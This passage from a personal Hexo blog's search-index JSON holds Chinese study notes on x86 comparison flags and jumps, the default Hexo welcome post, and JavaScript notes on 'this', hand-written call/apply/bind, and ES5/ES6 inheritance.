start=\"3\">\n<li>cmp 指令的标志位结果<br>\n cmp dst, src 的不同结果下的标志位变化：</li>\n</ol>\n<ul>\n<li>dst = src：ZF = 1, CF = 0（目标操作数等于源操作数）。</li>\n<li>dst &lt; src：ZF = 0, CF = 1（目标操作数小于源操作数）。</li>\n<li>dst &gt; src：ZF = 0, CF = 0（目标操作数大于源操作数）。</li>\n</ul>\n</li>\n<li>分支指令（Branching）<br>\n分支是根据程序的控制流有条件地执行代码序列。分支指令决定程序在特定条件下的跳转。\n<ol>\n<li>无条件跳转（Unconditional Jump）</li>\n</ol>\n<ul>\n<li>jmp <location>：无条件跳转指令会直接跳转到指定的位置（<location>），无论条件是否满足。</li>\n<li>用法：无条件跳转用于改变程序的执行顺序，是一种不依赖标志位的跳转形式。</li>\n</ul>\n<ol start=\"2\">\n<li>条件跳转（Conditional Jump）</li>\n</ol>\n<ul>\n<li>条件跳转指令：使用标志寄存器的值来决定是否进行跳转。常见的条件跳转指令有超过 30 种。</li>\n</ul>\n</li>\n</ol>\n","categories":["课程笔记","Principles of Software Security"],"tags":["software security","Linux","C language","gdb"]},{"title":"第一篇ovo","url":"/dailysharing/%E7%AC%AC%E4%B8%80%E7%AF%87ovo/","content":"<p>这是第一篇～</p>\n<p style=\"color: plum\">置顶占位 fufu宝宝镇楼o(=•ェ•=)m~</p>\n","categories":["日常碎碎念"],"tags":["Blog","日常"]},{"title":"Hello World","url":"/dailysharing/hello-world/","content":"<p>Welcome to <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvLw==\">Hexo</span>! This is your very first post. Check <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv\">documentation</span> for more info. If you get any problems when using Hexo, you can find the answer in <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=\">troubleshooting</span> or you can ask me on <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==\">GitHub</span>.</p>\n<h2 id=\"quick-start\"><a class=\"markdownIt-Anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"markdownIt-Anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s\">Writing</span></p>\n<h3 id=\"run-server\"><a class=\"markdownIt-Anchor\" href=\"#run-server\">#</a> Run server</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=\">Server</span></p>\n<h3 id=\"generate-static-files\"><a class=\"markdownIt-Anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s\">Generating</span></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"markdownIt-Anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s\">Deployment</span></p>\n"},{"title":"JS中的this与相关函数","url":"/study/JS%E4%B8%AD%E7%9A%84this%E4%B8%8E%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0/","content":"<h1 id=\"this指向\" class=\"active\"><a class=\"anchor\"  href=\"#this指向\">#</a> this指向</h1>\n在非严格模式下，总是指向一个对象，在严格模式下可以是任意值，开启严格模式可以使用如下两种方式:\n<figure class=\"highlight javascript\"><figcaption><span>(●ˇ∀ˇ●)</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 为整个脚本开启严格模式</span></span><br><span class=\"line\"><span class=\"meta\">&#x27;use strict&#x27;</span></span><br><span class=\"line\">unction <span class=\"title function_\">func</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 为函数开启严格模式</span></span><br><span class=\"line\">  <span class=\"string\">&#x27;use strict&#x27;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n然后就可以根据不同的模式来确认this指向啦，\n<ol>\n<li>\n<p>全局执行环境中，指向全局对象 (非严格模式、严格模式)</p>\n</li>\n<li>\n<p>函数内部，取决于函数被调用的方式</p>\n<ol>\n<li>\n<p>直接调用的 this 值:</p>\n<ol>\n<li>非严格模式：全局对象 (window)</li>\n<li>严格模式:undefined</li>\n</ol>\n</li>\n<li>\n<p>对象方法调用的 this 值:<br>\n 调用者</p>\n</li>\n</ol>\n</li>\n</ol>\n<h1 id=\"如何改变this指向\" class=\"active\"><a class=\"anchor\"  href=\"#如何改变this指向\">#</a> 如何改变this指向</h1>\n<ol>\n<li>\n<p>调用函数并传入具体的 <code>this</code> :</p>\n<ol>\n<li>\n<p><code>call</code> :</p>\n<ol>\n<li>参数 1: <code>this</code></li>\n<li>参数 2: 传递给函数的参数</li>\n</ol>\n</li>\n<li>\n<p><code>apply</code> : 数组作为参数</p>\n<ol>\n<li>参数 1: <code>this</code></li>\n<li>参数 2: 以数组的形式，传递给函数的参数</li>\n</ol>\n</li>\n</ol>\n</li>\n<li>\n<p>创建绑定 <code>this</code>  的函数:</p>\n<ol>\n<li>bind: 返回一个绑定了 <code>this</code>  的新函数</li>\n<li>箭头函数：就近向父级找 <code>this</code></li>\n</ol>\n</li>\n</ol>\n<h1 id=\"手搓call apply bind\" class=\"active\"><a class=\"anchor\"  href=\"#手搓call apply bind\">#</a> 手搓call apply bind</h1>\n  <h2 id=\"手搓call\" class=\"active\"><a class=\"anchor\"  href=\"#手搓call\">#</a> 手搓call</h2>\n<figure class=\"highlight javascript\"><figcaption><span>(●ˇ∀ˇ●)</span><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSmF2YVNjcmlwdC9SZWZlcmVuY2UvR2xvYmFsX09iamVjdHMvRnVuY3Rpb24vY2FsbA==\">参考链接</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//手写myCall 任何函数都能调用所以写到构造函数的原型上</span></span><br><span class=\"line\"><span class=\"title class_\">Function</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">myCall</span> = <span class=\"keyword\">function</span> (<span class=\"params\">thisArg, ...args</span>) &#123;</span><br><span class=\"line\">  <span class=\"comment\">//使用Symobl产生绝对唯一属性 防止传入对象中含有与新增属性重名的属性</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> z = <span class=\"title class_\">Symbol</span>(<span class=\"string\">&#x27;z&#x27;</span>)</span><br><span class=\"line\">  <span class=\"comment\">//this指的是调用myCall的函数 thisArg为传入的需要设置为this的对象</span></span><br><span class=\"line\">  thisArg[z] = <span class=\"variable language_\">this</span></span><br><span class=\"line\">  <span class=\"comment\">//args为传入调用myCall的函数的参数</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = thisArg[z](...args)</span><br><span class=\"line\">  <span class=\"comment\">//删掉传入对象新增属性z</span></span><br><span class=\"line\">  <span class=\"keyword\">delete</span> thisArg[z]</span><br><span class=\"line\">  <span class=\"comment\">//返回myCall调用者的结果</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"手搓apply\" class=\"active\"><a class=\"anchor\"  href=\"#手搓apply\">#</a> 手搓apply</h2>\n<figure class=\"highlight javascript\"><figcaption><span>(●ˇ∀ˇ●)</span><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSmF2YVNjcmlwdC9SZWZlcmVuY2UvR2xvYmFsX09iamVjdHMvRnVuY3Rpb24vYXBwbHk=\">参考链接</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//手写myApply</span></span><br><span class=\"line\"><span class=\"title class_\">Function</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">myApply</span> = <span class=\"keyword\">function</span> (<span class=\"params\">thisAry, args</span>) &#123;</span><br><span class=\"line\">  <span class=\"comment\">//与myCall唯一的不同就是传入的args参数为数组</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> w = <span class=\"title class_\">Symbol</span>(<span class=\"string\">&#x27;w&#x27;</span>)</span><br><span class=\"line\">  thisAry[w] = <span class=\"variable language_\">this</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = thisAry[w](...args)</span><br><span class=\"line\">  <span class=\"keyword\">delete</span> thisAry[w]</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"手搓bind\" class=\"active\"><a class=\"anchor\"  href=\"#手搓bind\">#</a> 手搓bind</h2>\n<figure class=\"highlight javascript\"><figcaption><span>(●ˇ∀ˇ●)</span><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSmF2YVNjcmlwdC9SZWZlcmVuY2UvR2xvYmFsX09iamVjdHMvRnVuY3Rpb24vYmluZA==\">参考链接</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">Function</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">myBind</span> = <span class=\"keyword\">function</span> (<span class=\"params\">thisArg, ...args</span>) &#123;</span><br><span class=\"line\">  <span class=\"comment\">//this是调用myBind的原函数 要把thisArg设置为新函数的this</span></span><br><span class=\"line\">  <span class=\"comment\">//...args是需要绑定的参数 ...reArgs是新函数需要传入的参数</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\">(<span class=\"params\">...reArgs</span>) =&gt;</span> <span class=\"variable language_\">this</span>.<span class=\"title function_\">call</span>(thisArg, ...args, ...reArgs)</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>","categories":["自学笔记","JavaScript"],"tags":["JavaScript"]},{"title":"js继承","url":"/study/js%E7%BB%A7%E6%89%BF/","content":"<h1 id=\"ES5\" class=\"active\"><a class=\"anchor\"  href=\"#ES5\">#</a> ES5</h1>\n<h2 id=\"ES5 原型链继承\" class=\"active\"><a class=\"anchor\"  href=\"#ES5 原型链继承\">#</a> ES5 原型链继承</h2>\n<ol>\n<li>将父类的实例作为子类的原型实现继承</li>\n<li>这种继承方法的缺点是父类中的引用类型数据会被所有子类共享</li>\n</ol>\n<figure class=\"highlight javascript\"><figcaption><span>(●ˇ∀ˇ●)</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">Son</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Parent</span>(<span class=\"string\">&#x27;name&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<h2 id=\"ES5 构造函数继承\" class=\"active\"><a class=\"anchor\"  href=\"#ES5 构造函数继承\">#</a> ES5 构造函数继承</h2>\n<ol>\n<li>在子类的构造函数中通过 <code>call</code>  或者 <code>apply</code>  调用父类的构造函数</li>\n<li>这种继承方法的缺点是：子类没法使用父类原型上的属性 / 方法</li>\n</ol>\n<figure class=\"highlight javascript\"><figcaption><span>(●ˇ∀ˇ●)</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">Son</span>(<span class=\"params\">name</span>) &#123;</span><br><span class=\"line\">  <span class=\"title class_\">Parent</span>.<span class=\"title function_\">call</span>(<span class=\"variable language_\">this</span>, name)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"ES5 组合继承\" class=\"active\"><a class=\"anchor\"  href=\"#ES5 组合继承\">#</a> ES5 组合继承</h2>\n<ol>\n<li>组合继承结合上面 2 种方法的优点:\n<ol>\n<li>通过原型链继承公共的属性和方法</li>\n<li>通过构造函数继承实例独有的属性和方法</li>\n</ol>\n</li>\n<li>组合继承的特点：调用 2 次父类的构造函数，浪费性能</li>\n</ol>\n<figure class=\"highlight javascript\"><figcaption><span>(●ˇ∀ˇ●)</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 子类构造函数</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">Son</span>(<span class=\"params\">name, age</span>) &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 调用父类构造函数传入this</span></span><br><span class=\"line\">  <span class=\"title class_\">Parent</span>.<span class=\"title function_\">call</span>(<span class=\"variable language_\">this</span>, name)</span><br><span class=\"line\">  <span class=\"comment\">// 子类独有的属性和方法单独设置</span></span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">age</span> = age</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 设置子类的原型为 父类实例</span></span><br><span class=\"line\"><span class=\"title class_\">Son</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Parent</span>()</span><br></pre></td></tr></table></figure>\n<h2 id=\"ES5 原型式继承\" class=\"active\"><a class=\"anchor\"  href=\"#ES5 原型式继承\">#</a> ES5 原型式继承</h2>\n<ol>\n<li>直接基于对象实现继承，对某个对象进行浅拷贝，可以通过内置 api <code>Object.create</code>  实现，不需要调用构造函数即可实现继承，主要针对于继承对象的情况</li>\n<li>原型式继承的缺点是：父类中的引用数据类型，会被所有子类共享</li>\n</ol>\n<figure class=\"highlight javascript\"><figcaption><span>(●ˇ∀ˇ●)</span><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSmF2YVNjcmlwdC9SZWZlcmVuY2UvR2xvYmFsX09iamVjdHMvT2JqZWN0L2NyZWF0ZQ==\">参考链接</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 可以用 Object.create替代</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">objectFactory</span>(<span class=\"params\">obj</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">function</span> <span class=\"title function_\">Fun</span>(<span class=\"params\"></span>) &#123; &#125;</span><br><span class=\"line\">  <span class=\"title class_\">Fun</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span> = obj</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Fun</span>()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">const</span> parent = &#123;</span><br><span class=\"line\">  <span class=\"attr\">name</span>: <span class=\"string\">&#x27;parent&#x27;</span>,</span><br><span class=\"line\">  <span class=\"attr\">age</span>: <span class=\"number\">25</span>,</span><br><span class=\"line\">  <span class=\"attr\">friend</span>: [<span class=\"string\">&#x27;zz&#x27;</span>, <span class=\"string\">&#x27;aa&#x27;</span>],</span><br><span class=\"line\">  <span class=\"title function_\">sayHi</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">name</span>, <span class=\"variable language_\">this</span>.<span class=\"property\">age</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">const</span> son1 = <span class=\"title function_\">objectFactory</span>(parent)</span><br><span class=\"line\"><span class=\"comment\">//const son1 = Object.create(parent)</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> son2 = <span class=\"title function_\">objectFactory</span>(parent)</span><br><span class=\"line\">son1.<span class=\"property\">friend</span>.<span class=\"title function_\">push</span>(<span class=\"string\">&#x27;Gin&#x27;</span>)</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(son2.<span class=\"property\">friend</span>)</span><br></pre></td></tr></table></figure>\n<h2 id=\"ES5 寄生式继承\" class=\"active\"><a class=\"anchor\"  href=\"#ES5 寄生式继承\">#</a> ES5 寄生式继承</h2>\n<ol>\n<li>寄生式继承的核心步骤是：基于对象创建新对象 (可以使用 <code>Object.create</code> ), 并且为新创建的对象增加新的属性和方法，通过定义工厂函数，并在内部:\n<ol>\n<li>对传入的对象进行浅拷贝 (公共属性 / 方法)</li>\n<li>为浅拷贝对象增加属性 / 方法 (独有属性 / 方法)</li>\n</ol>\n</li>\n<li>寄生式继承和原型式继承的区别是：创建出来的新对象，会额外的增加新的<strong>属性 / 方法</strong></li>\n</ol>\n<figure class=\"highlight javascript\"><figcaption><span>(●ˇ∀ˇ●)</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">createAnother</span>(<span class=\"params\">origin</span>) &#123;</span><br><span class=\"line\">  <span class=\"comment\">// Object.create基于原型创建新对象，对属性进行浅拷贝</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> clone = <span class=\"title class_\">Object</span>.<span class=\"title function_\">create</span>(origin)</span><br><span class=\"line\">  <span class=\"comment\">// 为对象增加属性/方法</span></span><br><span class=\"line\">  clone.<span class=\"property\">sayHi</span> = <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&#x27;你好&#x27;</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> clone</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">const</span> parent = &#123;</span><br><span class=\"line\">  <span class=\"attr\">name</span>: <span class=\"string\">&#x27;parent&#x27;</span>,</span><br><span class=\"line\">  <span class=\"attr\">friend</span>: [<span class=\"string\">&#x27;zz&#x27;</span>, <span class=\"string\">&#x27;aa&#x27;</span>]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">const</span> son1 = <span class=\"title function_\">createAnother</span>(parent)</span><br><span class=\"line\"><span class=\"keyword\">const</span> son2 = <span class=\"title function_\">createAnother</span>(parent)</span><br></pre></td></tr></table></figure>\n<h2 id=\"ES5 寄生组合式继承\" class=\"active\"><a class=\"anchor\"  href=\"#ES5 寄生组合式继承\">#</a> ES5 寄生组合式继承</h2>\n<ol>\n<li>通过构造函数来继承属性，通过原型链来继承方法</li>\n<li>寄生组合式继承和组合式继承的区别是：原型链的继承并没有调用父类的构造函数，而是直接基于父类的原型创建一个新副本实现继承</li>\n</ol>\n<figure class=\"highlight javascript\"><figcaption><span>(●ˇ∀ˇ●)</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 继承原型函数</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">inheritPrototype</span>(<span class=\"params\">son, parent</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> prototype = object.<span class=\"title function_\">create</span>(parent.<span class=\"property\"><span class=\"keyword\">prototype</span></span>)</span><br><span class=\"line\">    prototype.<span class=\"property\">constructor</span> = son</span><br><span class=\"line\">    son.<span class=\"property\"><span class=\"keyword\">prototype</span></span> = prototype</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 父类</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">Parent</span>(<span class=\"params\">name</span>) &#123;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">name</span> = name</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">friends</span> = [<span class=\"string\">&#x27;zz&#x27;</span>, <span class=\"string\">&#x27;aa&#x27;</span>,<span class=\"string\">&#x27;ss&#x27;</span>]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title class_\">Parent</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">sayHi</span> = <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">name</span>, <span class=\"string\">`My friends are,<span class=\"subst\">$&#123;<span class=\"variable language_\">this</span>.friends&#125;</span>`</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 子类借用父类的构造函数</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">Son</span>(<span class=\"params\">name, age</span>) &#123;</span><br><span class=\"line\">  <span class=\"title class_\">Parent</span>.<span class=\"title function_\">call</span>(<span class=\"variable language_\">this</span>, name)</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">age</span> = age</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 完成原型继承</span></span><br><span class=\"line\"><span class=\"title function_\">inheritPrototype</span>(<span class=\"title class_\">Son</span>,<span class=\"title class_\">Parent</span>)</span><br><span class=\"line\"><span class=\"comment\">// 可以继续在原型上添加属性/方法</span></span><br><span class=\"line\"><span class=\"title class_\">Son</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">sayAge</span> = <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&#x27;我的年龄是&#x27;</span>, <span class=\"variable language_\">this</span>.<span class=\"property\">age</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> son1 = <span class=\"keyword\">new</span> <span class=\"title class_\">Son</span>(<span class=\"string\">&#x27;zz&#x27;</span>, <span class=\"number\">18</span>)</span><br><span class=\"line\"><span class=\"keyword\">const</span> son2 = <span class=\"keyword\">new</span> <span class=\"title class_\">Son</span>(<span class=\"string\">&#x27;hh&#x27;</span>, <span class=\"number\">19</span>)</span><br></pre></td></tr></table></figure>\n<h1 id=\"ES6\" class=\"active\"><a class=\"anchor\"  href=\"#ES6\">#</a> ES6</h1>\n<h2 id=\"class核心语法\" class=\"active\"><a class=\"anchor\"  href=\"#class核心语法\">#</a> class核心语法</h2>\n<ol>\n<li>通过 <code>class 类名&#123;&#125;</code>  的形式来定义类</li>\n<li>内部直接写实例属性，可以设置默认值，</li>\n<li>实例方法的添加方式为 <code>方法名()&#123;&#125;</code></li>\n<li>构造函数通过 <code>constructor</code>  进行添加</li>\n<li>通过 <code>new 类名()</code>  创建实例，会调用构造函数 <code>constructor</code></li>\n</ol>\n<figure class=\"highlight javascript\"><figcaption><span>(●ˇ∀ˇ●)</span><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSmF2YVNjcmlwdC9SZWZlcmVuY2UvU3RhdGVtZW50cy9jbGFzcw==\">参考链接</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Parent</span>&#123;</span><br><span class=\"line\">    name</span><br><span class=\"line\">    friends = [<span class=\"string\">&#x27;zz&#x27;</span>, <span class=\"string\">&#x27;aa&#x27;</span>,<span class=\"string\">&#x27;ss&#x27;</span>]</span><br><span class=\"line\">    <span class=\"title function_\">constructor</span>(<span class=\"params\">name</span>)&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">this</span>.<span class=\"property\">name</span> = name</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t<span class=\"title function_\">sayHi</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&#x27;你好,我叫:&#x27;</span>,<span class=\"variable language_\">this</span>.<span class=\"property\">name</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"class实现继承\" class=\"active\"><a class=\"anchor\"  href=\"#class实现继承\">#</a> class实现继承</h2>\n<ol>\n<li>子类通过 <code>extends</code>  继承继承父类</li>\n<li>子类如果需要重新定义构造函数，必须在内部通过 <code>super</code>  关键字调用父类的构造函数</li>\n</ol>\n<figure class=\"highlight javascript\"><figcaption><span>(●ˇ∀ˇ●)</span><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSmF2YVNjcmlwdC9SZWZlcmVuY2UvT3BlcmF0b3JzL3N1cGVy\">参考链接</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Son</span> <span class=\"keyword\">extends</span> <span class=\"title class_ inherited__\">Parent</span> &#123;</span><br><span class=\"line\">  age</span><br><span class=\"line\">  <span class=\"title function_\">constructor</span>(<span class=\"params\">name, age</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 子类构造函数使用this以前必须调用super</span></span><br><span class=\"line\">    <span class=\"variable language_\">super</span>(name)</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">age</span> = age</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 添加方法</span></span><br><span class=\"line\">  <span class=\"title function_\">sayHey</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`我叫<span class=\"subst\">$&#123;<span class=\"variable language_\">this</span>.name&#125;</span>,我今年<span class=\"subst\">$&#123;<span class=\"variable language_\">this</span>.age&#125;</span>岁`</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">const</span> s = <span class=\"keyword\">new</span> <span class=\"title class_\">Son</span>(<span class=\"string\">&#x27;yy&#x27;</span>, <span class=\"string\">&#x27;18&#x27;</span>)</span><br><span class=\"line\">s.<span class=\"title function_\">sayHi</span>()</span><br><span class=\"line\">s.<span class=\"title function_\">sayHey</span>()</span><br></pre></td></tr></table></figure>\n<h2 id=\"class私有,静态属性和方法\" class=\"active\"><a class=\"anchor\"  href=\"#class私有,静态属性和方法\">#</a> class私有,静态属性和方法</h2>\n<ol>\n<li>\n<p>class 中私有属性 / 方法</p>\n<ol>\n<li><strong>定义和使用时</strong>需要使用关键字 <code>#</code></li>\n<li>私有属性只能在类的内部使用，外部无法使用 (代码中)</li>\n<li><strong>Chrome</strong> 的控制台中为了方便调试，可以直接访问</li>\n</ol>\n</li>\n<li>\n<p>class 中静态属性 / 方法</p>\n<ol>\n<li><strong>定义和使用时</strong>需要使用关键字 <code>static</code></li>\n<li>通过类访问</li>\n<li>静态方法中的 <code>this</code>  是类本身</li>\n</ol>\n</li>\n</ol>\n","categories":["自学笔记","JavaScript"],"tags":["JavaScript"]}]